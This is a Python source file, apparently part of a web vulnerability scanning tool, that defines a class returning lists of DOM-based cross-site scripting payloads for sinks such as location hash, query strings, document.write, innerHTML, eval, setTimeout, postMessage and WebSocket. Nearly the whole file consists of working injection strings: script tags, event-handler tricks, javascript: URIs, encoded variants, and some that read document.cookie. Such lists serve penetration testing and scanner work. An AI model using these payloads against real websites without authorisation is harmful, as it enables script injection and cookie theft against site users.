#!/usr/bin/env python3

"""
DOM XSS Payloads

Specialized payloads for DOM-based XSS vulnerabilities.

Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Created: Вс 10 авг 2025 19:35:00 MSK
Telegram: https://t.me/EasyProTech
"""

from typing import List, Optional


class DOMXSSPayloads:
    """DOM XSS payload collection"""
    
    @staticmethod
    def get_location_hash_payloads() -> List[str]:
        """Location hash based DOM XSS payloads"""
        return [
            # Basic hash payloads
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<iframe src=javascript:alert(1)>',
            '<body onload=alert(1)>',
            
            # URL encoded
            '%3Cscript%3Ealert(1)%3C/script%3E',
            '%3Cimg%20src=x%20onerror=alert(1)%3E',
            '%3Csvg%20onload=alert(1)%3E',
            
            # Double URL encoded
            '%253Cscript%253Ealert(1)%253C/script%253E',
            '%253Cimg%2520src=x%2520onerror=alert(1)%253E',
            
            # Fragment identifiers
            'javascript:alert(1)',
            'javascript:alert(document.domain)',
            'javascript:alert(location.href)',
            'data:text/html,<script>alert(1)</script>',
            
            # Hash with parameters
            'name=<script>alert(1)</script>',
            'value=<img src=x onerror=alert(1)>',
            'data=<svg onload=alert(1)>',
            'callback=alert',
            'function=alert(1)',
        ]
    
    @staticmethod
    def get_location_search_payloads() -> List[str]:
        """Location search (query string) based DOM XSS payloads"""
        return [
            # Query parameter injection
            '?xss=<script>alert(1)</script>',
            '?name=<img src=x onerror=alert(1)>',
            '?value=<svg onload=alert(1)>',
            '?callback=alert',
            '?function=alert(1)',
            
            # Multiple parameters
            '?a=<script>alert(1)</script>&b=test',
            '?test=1&xss=<img src=x onerror=alert(1)>',
            
            # Encoded query strings
            '?xss=%3Cscript%3Ealert(1)%3C/script%3E',
            '?name=%3Cimg%20src=x%20onerror=alert(1)%3E',
            
            # JavaScript in parameters
            '?callback=javascript:alert(1)',
            '?redirect=javascript:alert(1)',
            '?url=javascript:alert(1)',
            '?src=javascript:alert(1)',
            
            # JSONP callbacks
            '?callback=alert(1);//',
            '?jsonp=alert(1);//',
            '?cb=alert(1);//',
        ]
    
    @staticmethod
    def get_document_write_payloads() -> List[str]:
        """Document.write() sink payloads"""
        return [
            # Direct script injection
            '<script>alert(1)</script>',
            '<script>alert(document.domain)</script>',
            '<script>alert(document.cookie)</script>',
            
            # Event handlers
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<body onload=alert(1)>',
            '<iframe onload=alert(1)>',
            '<video oncanplay=alert(1)><source src=x>',
            '<audio oncanplay=alert(1)><source src=x>',
            
            # Form elements
            '<input autofocus onfocus=alert(1)>',
            '<select autofocus onfocus=alert(1)>',
            '<textarea autofocus onfocus=alert(1)>',
            '<button autofocus onfocus=alert(1)>',
            
            # Meta refresh
            '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
            '<meta http-equiv="refresh" content="0;url=data:text/html,<script>alert(1)</script>">',
            
            # Base tag
            '<base href="javascript:alert(1)//">',
            '<base href="data:text/html,<script>alert(1)</script>">',
        ]
    
    @staticmethod
    def get_innerhtml_payloads() -> List[str]:
        """innerHTML sink payloads"""
        return [
            # Image with onerror
            '<img src=x onerror=alert(1)>',
            '<img src=x onerror="alert(1)">',
            '<img src=x onerror=\'alert(1)\'>',
            '<img src=x onerror=alert(document.domain)>',
            '<img src=x onerror=alert(document.cookie)>',
            
            # SVG with onload
            '<svg onload=alert(1)>',
            '<svg onload="alert(1)">',
            '<svg onload=\'alert(1)\'>',
            '<svg onload=alert(document.domain)>',
            '<svg onload=alert(document.cookie)>',
            
            # Form elements with autofocus
            '<input autofocus onfocus=alert(1)>',
            '<select autofocus onfocus=alert(1)>',
            '<textarea autofocus onfocus=alert(1)>',
            '<button autofocus onfocus=alert(1)>',
            '<keygen autofocus onfocus=alert(1)>',
            
            # Details with ontoggle
            '<details open ontoggle=alert(1)>',
            '<details ontoggle=alert(1) open>',
            
            # Marquee with onstart
            '<marquee onstart=alert(1)>',
            '<marquee onstart="alert(1)">',
            
            # Video/Audio with events
            '<video autoplay oncanplay=alert(1)><source src=x>',
            '<audio autoplay oncanplay=alert(1)><source src=x>',
        ]
    
    @staticmethod
    def get_eval_payloads() -> List[str]:
        """eval() sink payloads"""
        return [
            # Direct eval
            'alert(1)',
            'alert(document.domain)',
            'alert(document.cookie)',
            'alert(location.href)',
            'prompt(1)',
            'confirm(1)',
            
            # Variable assignment
            'var x=alert;x(1)',
            'window.alert(1)',
            'this.alert(1)',
            'self.alert(1)',
            'parent.alert(1)',
            'top.alert(1)',
            
            # Constructor calls
            'new Function("alert(1)")()',
            'Array.constructor.constructor("alert(1)")()',
            'Object.constructor.constructor("alert(1)")()',
            
            # String manipulation
            'alert(String.fromCharCode(88,83,83))',
            'alert(atob("WFNT"))',
            'alert(unescape("%58%53%53"))',
            
            # Math operations
            'alert(Math.PI)',
            'alert(Math.floor(1.9))',
            'alert(parseInt("1"))',
            'alert(Number("1"))',
            
            # Document manipulation
            'document.body.innerHTML="<h1>XSS</h1>"',
            'document.title="XSS"',
            'document.cookie="xss=1"',
        ]
    
    @staticmethod
    def get_settimeout_payloads() -> List[str]:
        """setTimeout/setInterval sink payloads"""
        return [
            # String-based setTimeout
            'alert(1)',
            'alert(document.domain)',
            'alert(document.cookie)',
            'prompt(1)',
            'confirm(1)',
            
            # Variable access
            'window.alert(1)',
            'this.alert(1)',
            'self.alert(1)',
            'parent.alert(1)',
            'top.alert(1)',
            
            # Function construction
            'new Function("alert(1)")()',
            'Array.constructor.constructor("alert(1)")()',
            'Object.constructor.constructor("alert(1)")()',
            
            # String manipulation in timeout
            'alert(String.fromCharCode(88,83,83))',
            'alert(atob("WFNT"))',
            'alert(unescape("%58%53%53"))',
            
            # Document operations
            'document.body.innerHTML="<h1>XSS</h1>"',
            'document.write("<h1>XSS</h1>")',
            'document.title="XSS"',
            
            # Location manipulation
            'location.href="javascript:alert(1)"',
            'location.replace("javascript:alert(1)")',
            'location.assign("javascript:alert(1)")',
        ]
    
    @staticmethod
    def get_postmessage_payloads() -> List[str]:
        """PostMessage based DOM XSS payloads"""
        return [
            # Script injection via postMessage
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            
            # JSON payloads
            '{"type":"eval","data":"alert(1)"}',
            '{"command":"execute","code":"alert(1)"}',
            '{"action":"script","payload":"alert(1)"}',
            
            # Function calls
            'alert(1)',
            'prompt(1)',
            'confirm(1)',
            'console.log("XSS")',
            
            # Object with methods
            '{"toString":function(){return "alert(1)"}}',
            '{"valueOf":function(){return "alert(1)"}}',
            
            # Array with functions
            '[function(){alert(1)}]',
            '[function(){return "alert(1)"}]',
        ]
    
    @staticmethod
    def get_websocket_payloads() -> List[str]:
        """WebSocket based DOM XSS payloads"""
        return [
            # Direct script tags
            '<script>alert(1)</script>',
            '<script>alert(document.domain)</script>',
            
            # Event handlers
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<iframe onload=alert(1)>',
            
            # JSON WebSocket messages
            '{"type":"html","content":"<script>alert(1)</script>"}',
            '{"type":"eval","code":"alert(1)"}',
            '{"message":"<img src=x onerror=alert(1)>"}',
            
            # WebSocket protocol specific
            'data:text/html,<script>alert(1)</script>',
            'javascript:alert(1)',
        ]
    
    @staticmethod
    def get_all() -> List[str]:
        """Get all DOM XSS payloads"""
        payloads = []
        payloads.extend(DOMXSSPayloads.get_location_hash_payloads())
        payloads.extend(DOMXSSPayloads.get_location_search_payloads())
        payloads.extend(DOMXSSPayloads.get_document_write_payloads())
        payloads.extend(DOMXSSPayloads.get_innerhtml_payloads())
        payloads.extend(DOMXSSPayloads.get_eval_payloads())
        payloads.extend(DOMXSSPayloads.get_settimeout_payloads())
        payloads.extend(DOMXSSPayloads.get_postmessage_payloads())
        payloads.extend(DOMXSSPayloads.get_websocket_payloads())
        return payloads